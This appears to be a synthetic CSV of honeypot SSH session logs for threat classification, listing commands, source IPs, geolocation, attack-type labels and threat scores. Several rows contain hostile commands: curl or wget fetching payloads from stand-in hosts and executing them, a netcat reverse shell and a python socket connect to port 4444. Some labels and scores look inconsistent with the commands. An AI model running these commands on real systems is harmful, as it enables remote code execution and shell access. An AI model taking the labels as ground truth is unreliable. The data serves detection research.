session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10702,82.79.110.246,2025-10-03T19:59:51.746466Z,test,find / -maxdepth 2 -type f | head -n 20,35,1,0,,55.749831,37.656264,RU,benign,0.905
sess_10737,217.81.216.88,2025-10-03T20:00:41.746466Z,ftp,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,34,3,1,sha256:e7c1b38b764d7d588a6241bf1cbb14607216499dbabde57c1ce081c845ccdcfa,37.445637,126.465574,KR,reverse_shell,1.0
sess_10708,217.81.216.88,2025-10-03T20:08:54.746466Z,unknown,grep -R 'password' /var/log || true,21,1,0,,40.282918,116.018733,CN,benign,0.555
sess_10711,213.4.54.139,2025-10-03T20:10:37.746466Z,pi,cat /etc/passwd | grep root,1,1,0,,51.103173,-0.329692,GB,benign,0.055
sess_10763,100.150.239.191,2025-10-03T20:30:31.746466Z,postgres,grep -R 'password' /var/log || true; whoami; pwd; ls -la,2,4,0,,29.168146,76.732474,IN,benign,0.17
sess_10765,99.135.22.187,2025-10-03T20:33:21.746466Z,admin,grep -R 'password' /var/log || true,48,1,0,,52.912024,13.579118,DE,benign,1.0
sess_10705,80.26.127.254,2025-10-03T20:34:27.746466Z,ubuntu,python3 -c 'print(2+2)',0,1,0,,53.055713,13.865784,DE,benign,0.03
sess_10742,145.109.132.48,2025-10-03T20:36:24.746466Z,root,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",6,3,0,,55.394126,38.14763,RU,reverse_shell,0.24
sess_10723,108.49.183.217,2025-10-03T20:36:33.746466Z,oracle,curl -s http://evil.tld/payload.sh | sh,57,1,1,sha256:8b909045237939a582fe558f236a7e2052e3528509b5afcde385461c2318ef03,28.64684,77.747519,IN,reverse_shell,1.0
sess_10725,206.172.52.24,2025-10-03T20:36:59.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x; find / -maxdepth 2 -type f | head -n 20,55,3,0,,52.192778,13.92274,DE,benign,1.0
sess_10749,108.49.183.217,2025-10-03T20:43:38.746466Z,admin,ls -la; id; uname -a; nc -lvp 4444 &,16,4,0,,-23.554814,-46.331228,BR,benign,0.52
sess_10716,186.154.146.90,2025-10-03T20:48:39.746466Z,admin,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,0,2,0,,35.092115,140.211414,JP,benign,0.06
sess_10695,206.172.52.24,2025-10-03T21:04:05.746466Z,guest,ps aux | grep sshd,13,1,0,,52.376423,13.434965,DE,recon,0.355
sess_10687,82.79.110.246,2025-10-03T21:22:52.746466Z,root,ps aux | grep sshd; nc -lvp 4444 &,22,2,0,,37.068193,126.995182,KR,benign,0.61
sess_10679,212.206.244.152,2025-10-03T21:28:27.746466Z,guest,chmod +x /tmp/h; /tmp/h &,5,2,0,,-23.695939,-46.350793,BR,payload_exec,0.185
sess_10684,146.21.229.247,2025-10-03T21:39:38.746466Z,www-data,cat /etc/passwd | grep root,0,1,0,,48.317688,2.346809,FR,recon,0.03
sess_10694,206.172.52.24,2025-10-03T21:47:47.746466Z,postgres,python3 -c 'print(2+2)',47,1,0,,49.011289,1.930671,FR,benign,1.0
sess_10690,217.81.216.88,2025-10-03T22:11:24.746466Z,root,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",31,3,0,,38.256097,-122.827025,US,payload_exec,0.865
sess_10693,199.4.222.123,2025-10-03T22:12:39.746466Z,guest,cat /etc/passwd | grep root; cat /etc/passwd | grep root,3,2,0,,29.0509,77.802108,IN,benign,0.135
sess_10685,125.142.3.195,2025-10-03T22:25:54.746466Z,www-data,whoami; pwd; ls -la,10,3,0,,52.805631,13.48761,DE,benign,0.34
sess_10677,125.142.3.195,2025-10-03T22:36:36.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20,29,1,0,,37.673092,127.346158,KR,benign,0.755
sess_10696,70.113.172.110,2025-10-03T23:04:28.746466Z,root,whoami; pwd; ls -la,0,3,0,,35.591189,139.475509,JP,benign,0.09
sess_10676,125.142.3.195,2025-10-03T23:18:44.746466Z,admin,ls -la; id; uname -a; python3 -c 'print(2+2)',27,4,0,,35.265096,140.049417,JP,benign,0.795
sess_10689,217.81.216.88,2025-10-03T23:20:05.746466Z,unknown,python3 -c 'print(2+2)'; ps aux | grep sshd,10,2,0,,-23.719416,-46.188683,BR,benign,0.31
sess_10682,82.79.110.246,2025-10-03T23:24:56.746466Z,postgres,grep -R 'password' /var/log || true,56,1,0,,55.319514,37.614666,RU,benign,1.0
sess_10683,184.63.207.4,2025-10-03T23:41:54.746466Z,ubuntu,python3 -c 'print(2+2)',0,1,0,,28.90068,77.750042,IN,benign,0.03
sess_10681,81.219.117.79,2025-10-03T23:47:11.746466Z,admin,find / -maxdepth 2 -type f | head -n 20; find / -maxdepth 2 -type f | head -n 20,0,2,0,,51.01976,-0.03742,GB,recon,0.06
sess_10680,99.135.22.187,2025-10-03T23:48:09.746466Z,pi,python3 -c 'print(2+2)',38,1,0,,38.358396,-122.061237,US,benign,0.98
sess_10675,79.98.190.145,2025-10-03T23:53:06.746466Z,www-data,ps aux | grep sshd,1,1,0,,51.951092,13.529329,DE,benign,0.055
sess_10678,82.79.110.246,2025-10-04T00:04:53.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,34,3,0,,39.521007,116.774702,CN,benign,0.94
sess_10688,125.142.3.195,2025-10-04T01:02:57.746466Z,postgres,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,24,3,0,,39.869038,116.256571,CN,reverse_shell,0.69
sess_10686,82.79.110.246,2025-10-04T01:07:19.746466Z,www-data,grep -R 'password' /var/log || true,13,1,0,,35.516393,139.830336,JP,benign,0.355
sess_10692,113.199.67.29,2025-10-04T01:15:07.746466Z,admin,cat /etc/passwd | grep root,0,1,0,,55.969772,37.427869,RU,benign,0.03
sess_10691,206.172.52.24,2025-10-04T01:15:40.746466Z,www-data,ps aux | grep sshd,55,1,0,,51.060321,0.173508,GB,benign,1.0
sess_10601,60.184.22.250,2025-10-04T01:36:43.746466Z,ubuntu,curl -s http://evil.tld/payload.sh | sh,4,1,1,sha256:63ab132b401f1ee5219cfac6e6cdf2a5bc7f259eae41a77a94dd390ef742e730,51.572806,-0.51355,GB,malware_fetch,0.63
sess_10593,42.43.31.235,2025-10-04T01:37:43.746466Z,oracle,find / -maxdepth 2 -type f | head -n 20,0,1,0,,28.746786,77.127207,IN,benign,0.03
sess_10575,217.164.205.151,2025-10-04T01:40:54.746466Z,postgres,whoami; pwd; ls -la,1,3,0,,52.378413,12.91423,DE,recon,0.115
sess_10626,19.110.226.179,2025-10-04T01:41:39.746466Z,www-data,ps aux | grep sshd,0,1,0,,36.016392,140.012237,JP,recon,0.03
sess_10650,103.204.193.157,2025-10-04T01:44:14.746466Z,pi,ls -la; id; uname -a,3,3,0,,38.284945,-122.988583,US,benign,0.165
sess_10578,141.197.58.69,2025-10-04T01:45:10.746466Z,pi,ls -la; id; uname -a; ls -la; id; uname -a,0,6,0,,39.96909,116.510807,CN,benign,0.18
sess_10658,91.194.0.80,2025-10-04T01:45:30.746466Z,user,grep -R 'password' /var/log || true; whoami; pwd; ls -la,3,4,0,,39.927902,116.529341,CN,benign,0.195
sess_10624,94.237.248.119,2025-10-04T01:47:14.746466Z,admin,python3 -c 'print(2+2)',0,1,0,,48.45024,2.758395,FR,benign,0.03
sess_10605,43.250.107.187,2025-10-04T01:50:50.746466Z,unknown,cat /etc/passwd | grep root,3,1,0,,52.369119,13.427671,DE,benign,0.105
sess_10609,176.38.183.231,2025-10-04T01:51:07.746466Z,guest,find / -maxdepth 2 -type f | head -n 20,0,1,0,,-24.104562,-46.992932,BR,recon,0.03
sess_10627,74.191.122.52,2025-10-04T01:53:34.746466Z,root,whoami; pwd; ls -la,0,3,0,,38.025243,127.334309,KR,benign,0.09
sess_10602,16.90.134.234,2025-10-04T01:56:14.746466Z,root,ps aux | grep sshd,5,1,0,,55.521887,37.30548,RU,recon,0.155
sess_10629,120.61.118.55,2025-10-04T01:57:31.746466Z,pi,ps aux | grep sshd,1,1,0,,-24.07128,-46.255198,BR,benign,0.055
sess_10584,148.15.227.173,2025-10-04T02:02:19.746466Z,pi,find / -maxdepth 2 -type f | head -n 20; whoami; pwd; ls -la,2,4,0,,48.266718,2.307431,FR,benign,0.17
sess_10625,166.51.90.76,2025-10-04T02:02:31.746466Z,ftp,ls -la; id; uname -a,0,3,0,,52.349704,13.065007,DE,benign,0.09
sess_10646,56.191.95.181,2025-10-04T02:05:17.746466Z,ubuntu,ps aux | grep sshd,0,1,0,,35.308775,140.002698,JP,benign,0.03
sess_10666,177.173.222.249,2025-10-04T02:09:11.746466Z,www-data,ls -la; id; uname -a,2,3,0,,36.234966,139.875056,JP,benign,0.14
sess_10569,157.148.20.134,2025-10-04T02:10:28.746466Z,admin,whoami; pwd; ls -la; ps aux | grep sshd,1,4,0,,-24.092119,-46.160196,BR,recon,0.145
sess_10638,123.216.221.195,2025-10-04T02:11:10.746466Z,unknown,ps aux | grep sshd; ls -la; id; uname -a,1,4,0,,39.967623,116.018239,CN,benign,0.145
sess_10581,100.108.144.12,2025-10-04T02:12:41.746466Z,unknown,whoami; pwd; ls -la,0,3,0,,51.575175,-0.39245,GB,recon,0.09
sess_10552,187.44.247.34,2025-10-04T02:15:56.746466Z,ubuntu,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",3,3,0,,55.74827,37.298963,RU,malware_fetch,0.165
sess_10636,47.104.64.24,2025-10-04T02:16:02.746466Z,user,cat /etc/passwd | grep root,0,1,0,,35.955509,139.38561,JP,benign,0.03
sess_10576,36.86.146.37,2025-10-04T02:18:29.746466Z,guest,whoami; pwd; ls -la,2,3,0,,35.479849,139.124305,JP,benign,0.14
sess_10653,36.197.150.156,2025-10-04T02:21:53.746466Z,unknown,chmod +x /tmp/h; /tmp/h &,3,2,0,,28.051995,77.20651,IN,payload_exec,0.135
sess_10619,90.103.234.71,2025-10-04T02:23:41.746466Z,root,ls -la; id; uname -a; ps aux | grep sshd,5,4,0,,-23.095413,-46.681055,BR,benign,0.245
sess_10568,128.66.60.178,2025-10-04T02:26:40.746466Z,postgres,grep -R 'password' /var/log || true,2,1,0,,39.794544,115.95244,CN,benign,0.08
sess_10572,94.45.209.100,2025-10-04T02:32:11.746466Z,oracle,grep -R 'password' /var/log || true,2,1,0,,56.194944,37.86595,RU,benign,0.08
sess_10612,69.116.107.122,2025-10-04T02:32:26.746466Z,ftp,python3 -c 'print(2+2)'; ps aux | grep sshd,0,2,0,,56.079957,37.85483,RU,benign,0.06
sess_10592,75.126.55.122,2025-10-04T02:33:42.746466Z,pi,echo 'hello' > /tmp/x; cat /tmp/x; cat /etc/passwd | grep root,1,3,0,,55.270605,37.553047,RU,benign,0.115
sess_10554,69.61.114.125,2025-10-04T02:39:01.746466Z,pi,find / -maxdepth 2 -type f | head -n 20,4,1,0,,49.305035,2.477347,FR,benign,0.13
sess_10657,154.223.119.58,2025-10-04T02:39:21.746466Z,admin,ls -la; id; uname -a,2,3,0,,37.105827,126.819284,KR,benign,0.14
sess_10639,108.237.156.117,2025-10-04T02:45:57.746466Z,oracle,ls -la; id; uname -a; cat /etc/passwd | grep root,0,4,0,,-24.135099,-46.63246,BR,benign,0.12
sess_10565,163.119.179.77,2025-10-04T02:46:18.746466Z,www-data,python3 -c 'print(2+2)',0,1,0,,52.618843,13.792411,DE,benign,0.03
sess_10607,126.120.202.56,2025-10-04T02:52:10.746466Z,oracle,grep -R 'password' /var/log || true,0,1,0,,37.067334,126.911406,KR,benign,0.03
sess_10644,75.154.195.151,2025-10-04T02:52:42.746466Z,unknown,ls -la; id; uname -a,3,3,0,,48.579426,2.003631,FR,benign,0.165
sess_10559,194.35.43.87,2025-10-04T02:54:34.746466Z,oracle,ps aux | grep sshd,5,1,0,,-23.969357,-46.543831,BR,recon,0.155
sess_10577,25.152.199.26,2025-10-04T02:56:00.746466Z,test,whoami; pwd; ls -la; grep -R 'password' /var/log || true,0,4,0,,37.682906,126.661789,KR,recon,0.12
sess_10599,95.171.153.108,2025-10-04T02:58:21.746466Z,test,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:01dbff60634581d92b1db156adb65389f4ae4fbaed8d1200171fd707896b2236,-23.874171,-46.484596,BR,reverse_shell,0.715
sess_10611,208.153.144.211,2025-10-04T03:03:16.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; find / -maxdepth 2 -type f | head -n 20; nc -lvp 4444 &,6,3,0,,52.049187,0.310759,GB,benign,0.24
sess_10556,53.60.105.234,2025-10-04T03:07:22.746466Z,test,find / -maxdepth 2 -type f | head -n 20; ps aux | grep sshd,0,2,0,,36.072493,139.23928,JP,benign,0.06
sess_10633,169.40.30.36,2025-10-04T03:10:53.746466Z,postgres,ps aux | grep sshd,2,1,0,,29.200162,77.141471,IN,benign,0.08
sess_10628,223.85.85.12,2025-10-04T03:22:07.746466Z,ftp,nc -e /bin/sh 10.10.10.5 4444,6,1,0,,39.552743,116.457443,CN,reverse_shell,0.18
sess_10596,157.64.131.91,2025-10-04T03:23:34.746466Z,postgres,cat /etc/passwd | grep root; cat /etc/passwd | grep root; nc -lvp 4444 &,1,3,0,,35.705251,139.873746,JP,recon,0.115
sess_10641,155.83.99.196,2025-10-04T03:27:45.746466Z,guest,echo 'hello' > /tmp/x; cat /tmp/x; ps aux | grep sshd,2,3,0,,52.019223,0.154997,GB,benign,0.14
sess_10651,42.143.127.95,2025-10-04T03:32:01.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)'; nc -lvp 4444 &,5,4,0,,51.29402,0.032733,GB,benign,0.245
sess_10555,37.25.224.205,2025-10-04T03:33:26.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:14ad4c48e31c36d5050a629e95f9573b387e70c28eb771e3a8f0008bfeb68e0f,52.594967,13.413767,DE,payload_exec,0.64
sess_10597,102.159.74.38,2025-10-04T03:36:49.746466Z,guest,whoami; pwd; ls -la; ls -la; id; uname -a,0,6,0,,37.575029,127.38021,KR,benign,0.18
sess_10567,114.202.135.150,2025-10-04T03:44:49.746466Z,www-data,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,0,2,0,,37.573443,126.959717,KR,benign,0.06
sess_10660,190.17.163.80,2025-10-04T03:45:47.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,37.768931,-122.174431,US,payload_exec,0.115
sess_10608,101.117.21.120,2025-10-04T03:48:29.746466Z,user,ps aux | grep sshd; ps aux | grep sshd,0,2,0,,39.519679,116.087948,CN,benign,0.06
sess_10589,115.140.62.175,2025-10-04T03:50:08.746466Z,postgres,grep -R 'password' /var/log || true,1,1,0,,-23.611866,-47.227109,BR,benign,0.055
sess_10649,144.3.192.155,2025-10-04T03:50:37.746466Z,unknown,ps aux | grep sshd; whoami; pwd; ls -la,4,4,0,,-22.951166,-46.253083,BR,benign,0.22
sess_10603,218.190.87.241,2025-10-04T03:52:30.746466Z,unknown,grep -R 'password' /var/log || true; ls -la; id; uname -a,3,4,0,,28.243918,77.062835,IN,benign,0.195
sess_10659,67.54.202.3,2025-10-04T03:55:36.746466Z,postgres,find / -maxdepth 2 -type f | head -n 20; ps aux | grep sshd,0,2,0,,-23.352079,-46.27175,BR,benign,0.06
sess_10562,96.199.64.134,2025-10-04T03:56:17.746466Z,guest,chmod +x /tmp/h; /tmp/h &,0,2,0,,55.918623,37.045406,RU,payload_exec,0.06
sess_10561,114.228.105.228,2025-10-04T03:57:16.746466Z,user,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,0,2,0,,51.269238,-0.683436,GB,benign,0.06
sess_10674,82.65.216.20,2025-10-04T03:58:45.746466Z,guest,ps aux | grep sshd,1,1,0,,49.090018,2.395285,FR,benign,0.055
sess_10622,66.252.210.196,2025-10-04T03:59:34.746466Z,admin,find / -maxdepth 2 -type f | head -n 20,1,1,0,,55.353607,37.266147,RU,benign,0.055
sess_10613,64.224.230.219,2025-10-04T04:01:06.746466Z,root,whoami; pwd; ls -la,2,3,0,,28.439495,76.879589,IN,benign,0.14
sess_10573,157.158.63.165,2025-10-04T04:01:21.746466Z,admin,chmod +x /tmp/h; /tmp/h &,6,2,0,,28.698193,76.836275,IN,payload_exec,0.21
sess_10588,184.11.129.175,2025-10-04T04:01:33.746466Z,postgres,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",2,3,0,,40.328832,116.194999,CN,payload_exec,0.14
sess_10579,36.126.64.78,2025-10-04T04:03:47.746466Z,oracle,find / -maxdepth 2 -type f | head -n 20,0,1,0,,-23.856306,-46.090165,BR,benign,0.03
sess_10590,60.171.41.226,2025-10-04T04:04:45.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,6,3,0,,37.264228,-122.719419,US,malware_fetch,0.24
sess_10637,56.127.155.74,2025-10-04T04:06:01.746466Z,postgres,whoami; pwd; ls -la,6,3,0,,37.444393,126.579319,KR,recon,0.24
sess_10614,119.206.153.84,2025-10-04T04:08:53.746466Z,root,grep -R 'password' /var/log || true,0,1,0,,49.012407,2.475803,FR,benign,0.03
sess_10587,152.99.89.17,2025-10-04T04:09:13.746466Z,test,whoami; pwd; ls -la,1,3,0,,37.905203,126.608222,KR,benign,0.115
sess_10670,179.60.92.221,2025-10-04T04:12:12.746466Z,unknown,chmod +x /tmp/h; /tmp/h &,8,2,0,,37.329479,-122.771924,US,reverse_shell,0.26
sess_10652,22.166.227.60,2025-10-04T04:14:18.746466Z,postgres,whoami; pwd; ls -la,1,3,0,,55.945807,37.8567,RU,benign,0.115
sess_10591,53.168.159.17,2025-10-04T04:19:33.746466Z,www-data,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",3,3,0,,51.658957,-0.326637,GB,reverse_shell,0.165
sess_10604,106.162.219.251,2025-10-04T04:22:19.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20,0,1,0,,49.011951,2.088288,FR,recon,0.03
sess_10623,22.236.13.19,2025-10-04T04:23:04.746466Z,unknown,ps aux | grep sshd; python3 -c 'print(2+2)',0,2,0,,28.151519,77.709564,IN,benign,0.06
sess_10632,160.229.195.131,2025-10-04T04:23:32.746466Z,unknown,cat /etc/passwd | grep root,0,1,0,,56.041296,37.925995,RU,benign,0.03
sess_10634,95.68.142.82,2025-10-04T04:24:21.746466Z,unknown,python3 -c 'print(2+2)'; whoami; pwd; ls -la; nc -lvp 4444 &,0,5,0,,48.547299,2.399374,FR,benign,0.15
sess_10620,158.20.46.74,2025-10-04T04:25:05.746466Z,postgres,ps aux | grep sshd; find / -maxdepth 2 -type f | head -n 20,0,2,0,,37.916184,-122.500908,US,benign,0.06
sess_10617,83.105.119.75,2025-10-04T04:28:43.746466Z,ftp,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,6,3,1,sha256:80ec6dc6ead0d584f3df0c3d3c7f14dad58261da4d14ae98a0accccf3b7adc31,37.459533,126.566443,KR,reverse_shell,0.74
sess_10648,18.120.244.125,2025-10-04T04:32:20.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,8,3,1,sha256:deaedd0061653ed45c1e9c461d75272bafdc3996f4a38faa61560c1de7beb46c,40.489343,115.92361,CN,reverse_shell,0.79
sess_10616,88.47.87.27,2025-10-04T04:32:54.746466Z,ftp,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,6,3,0,,35.172889,140.247293,JP,payload_exec,0.24
sess_10582,121.107.162.227,2025-10-04T04:34:52.746466Z,pi,whoami; pwd; ls -la; python3 -c 'print(2+2)',5,4,0,,55.549949,38.114122,RU,benign,0.245
sess_10656,196.251.46.204,2025-10-04T04:37:31.746466Z,pi,python3 -c 'print(2+2)',2,1,0,,35.547481,139.862223,JP,benign,0.08
sess_10606,56.164.191.135,2025-10-04T04:38:15.746466Z,postgres,ps aux | grep sshd; echo 'hello' > /tmp/x; cat /tmp/x,2,3,0,,35.33814,140.165562,JP,benign,0.14
sess_10664,178.83.70.114,2025-10-04T04:38:39.746466Z,postgres,cat /etc/passwd | grep root,2,1,0,,48.691271,2.77957,FR,benign,0.08
sess_10663,111.36.144.73,2025-10-04T04:38:46.746466Z,ubuntu,ls -la; id; uname -a; whoami; pwd; ls -la,0,6,0,,29.135391,76.973889,IN,benign,0.18
sess_10621,109.93.48.101,2025-10-04T04:39:23.746466Z,root,whoami; pwd; ls -la,5,3,0,,51.745053,0.139091,GB,benign,0.215
sess_10669,193.94.207.209,2025-10-04T04:39:57.746466Z,root,ls -la; id; uname -a; find / -maxdepth 2 -type f | head -n 20,2,4,0,,-23.24629,-46.984343,BR,benign,0.17
sess_10586,20.143.252.232,2025-10-04T04:40:52.746466Z,unknown,cat /etc/passwd | grep root,4,1,0,,35.772423,139.684514,JP,benign,0.13
sess_10566,103.232.50.38,2025-10-04T04:42:56.746466Z,oracle,ls -la; id; uname -a,0,3,0,,35.183187,139.903887,JP,recon,0.09
sess_10564,42.229.152.147,2025-10-04T04:49:49.746466Z,root,find / -maxdepth 2 -type f | head -n 20,4,1,0,,49.009893,2.392146,FR,benign,0.13
sess_10570,83.110.93.210,2025-10-04T04:50:35.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,5,2,0,,37.752312,-122.647758,US,reverse_shell,0.185
sess_10600,72.246.169.207,2025-10-04T04:50:42.746466Z,oracle,curl -s http://evil.tld/payload.sh | sh,5,1,1,sha256:df6f6260ee7d96adaa54a6928a8b51194742c8b0db5df5531d22e0646a4d9b38,37.313127,-122.670709,US,malware_fetch,0.655
sess_10585,60.227.4.57,2025-10-04T04:51:32.746466Z,root,cat /etc/passwd | grep root; find / -maxdepth 2 -type f | head -n 20,0,2,0,,53.096143,13.965756,DE,benign,0.06
sess_10618,39.66.214.123,2025-10-04T04:51:32.746466Z,admin,cat /etc/passwd | grep root,2,1,0,,39.873936,116.531851,CN,benign,0.08
sess_10610,61.168.128.78,2025-10-04T04:52:06.746466Z,unknown,cat /etc/passwd | grep root; echo 'hello' > /tmp/x; cat /tmp/x,2,3,0,,37.826651,-122.706037,US,benign,0.14
sess_10668,157.245.140.178,2025-10-04T04:52:08.746466Z,admin,ps aux | grep sshd,0,1,0,,39.454484,116.197675,CN,benign,0.03
sess_10671,52.44.131.218,2025-10-04T04:54:15.746466Z,root,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:a641b55dd36d0089ca00598392c3feaa9fed17ae03cf3ebaa0b9d33ee319cb58,52.079924,0.061991,GB,payload_exec,0.59
sess_10557,62.224.212.197,2025-10-04T04:58:36.746466Z,root,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,3,5,0,,37.399272,127.175994,KR,benign,0.225
sess_10643,165.82.6.30,2025-10-04T04:59:08.746466Z,admin,ps aux | grep sshd; echo 'hello' > /tmp/x; cat /tmp/x,0,3,0,,28.521434,77.604699,IN,benign,0.09
sess_10563,214.132.123.214,2025-10-04T05:00:00.746466Z,guest,python3 -c 'print(2+2)',1,1,0,,28.162476,77.516872,IN,benign,0.055
sess_10558,49.215.116.36,2025-10-04T05:07:33.746466Z,oracle,grep -R 'password' /var/log || true; grep -R 'password' /var/log || true,5,2,0,,39.835294,116.731582,CN,benign,0.185
sess_10580,153.231.21.1,2025-10-04T05:10:31.746466Z,postgres,python3 -c 'print(2+2)'; cat /etc/passwd | grep root,0,2,0,,37.475967,-122.203403,US,benign,0.06
sess_10642,73.244.17.236,2025-10-04T05:10:39.746466Z,pi,python3 -c 'print(2+2)',1,1,0,,55.97308,37.322446,RU,benign,0.055
sess_10662,135.200.153.253,2025-10-04T05:11:10.746466Z,www-data,grep -R 'password' /var/log || true,2,1,0,,56.344177,37.926557,RU,benign,0.08
sess_10667,107.45.237.222,2025-10-04T05:12:02.746466Z,www-data,whoami; pwd; ls -la; ls -la; id; uname -a,2,6,0,,37.578198,126.405632,KR,benign,0.23
sess_10673,148.107.50.170,2025-10-04T05:12:28.746466Z,root,cat /etc/passwd | grep root,0,1,0,,28.676385,77.31914,IN,benign,0.03
sess_10661,107.30.170.40,2025-10-04T05:14:41.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,7,3,0,,51.945918,-0.512976,GB,malware_fetch,0.265
sess_10571,126.172.193.122,2025-10-04T05:16:28.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20,1,1,0,,51.44629,0.311815,GB,benign,0.055
sess_10594,37.28.26.76,2025-10-04T05:20:42.746466Z,oracle,cat /etc/passwd | grep root; echo 'hello' > /tmp/x; cat /tmp/x,0,3,0,,49.210798,2.808126,FR,recon,0.09
sess_10635,181.127.113.156,2025-10-04T05:26:55.746466Z,oracle,ps aux | grep sshd; nc -lvp 4444 &,0,2,0,,52.150959,13.56624,DE,benign,0.06
sess_10553,153.24.9.92,2025-10-04T05:29:09.746466Z,guest,cat /etc/passwd | grep root,3,1,0,,28.419182,76.745763,IN,benign,0.105
sess_10630,177.188.22.18,2025-10-04T05:30:24.746466Z,ubuntu,grep -R 'password' /var/log || true; ls -la; id; uname -a,4,4,0,,37.380651,-121.868558,US,benign,0.22
sess_10560,172.151.214.103,2025-10-04T05:30:29.746466Z,www-data,python3 -c 'print(2+2)'; whoami; pwd; ls -la,4,4,0,,37.907381,-122.843166,US,benign,0.22
sess_10654,33.154.239.44,2025-10-04T05:33:23.746466Z,postgres,python3 -c 'print(2+2)'; cat /etc/passwd | grep root,2,2,0,,48.363918,2.274072,FR,benign,0.11
sess_10583,45.1.243.2,2025-10-04T05:34:46.746466Z,root,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',0,3,0,,29.065964,77.39052,IN,benign,0.09
sess_10647,77.209.225.161,2025-10-04T05:37:55.746466Z,user,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,5,3,0,,37.116118,126.455115,KR,malware_fetch,0.215
sess_10631,164.166.198.174,2025-10-04T05:41:04.746466Z,unknown,cat /etc/passwd | grep root; find / -maxdepth 2 -type f | head -n 20,2,2,0,,50.988416,-0.706621,GB,benign,0.11
sess_10640,196.191.251.104,2025-10-04T05:41:23.746466Z,oracle,ps aux | grep sshd; whoami; pwd; ls -la,4,4,0,,38.365867,-122.870027,US,recon,0.22
sess_10655,194.14.82.238,2025-10-04T05:42:17.746466Z,pi,cat /etc/passwd | grep root; whoami; pwd; ls -la,0,4,0,,52.082908,13.446452,DE,benign,0.12
sess_10574,132.9.61.169,2025-10-04T05:44:15.746466Z,ftp,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,8,3,1,sha256:44db096c64ecdde848d0e102128aa57b682e8becbee8a3a332b4e0421c0f4039,49.321787,2.285275,FR,reverse_shell,0.79
sess_10595,169.51.173.167,2025-10-04T05:44:38.746466Z,www-data,echo 'hello' > /tmp/x; cat /tmp/x; echo 'hello' > /tmp/x; cat /tmp/x,2,4,0,,52.631464,13.813935,DE,recon,0.17
sess_10672,74.153.23.243,2025-10-04T05:46:52.746466Z,ftp,python3 -c 'print(2+2)'; ps aux | grep sshd,1,2,0,,56.339023,37.439841,RU,benign,0.085
sess_10615,166.200.195.53,2025-10-04T05:47:40.746466Z,oracle,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",1,3,0,,53.074326,13.571804,DE,malware_fetch,0.115
